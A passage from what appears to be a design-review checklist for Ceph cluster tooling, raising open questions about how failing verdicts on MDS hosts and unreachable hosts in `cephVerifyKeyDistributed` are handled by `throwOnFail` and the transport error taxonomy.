   placement host runs an active MDS. With the default `throwOnFail: true`,
   that halts the caller. Confirm that a failing verdict counts as "reports"
   under D29.
5. **Unreachable host in `cephVerifyKeyDistributed`.** The specified behaviour
   is: record all hosts, then throw the typed transport error regardless of
   `throwOnFail`. Confirm this against the error taxonomy in 01-transport.
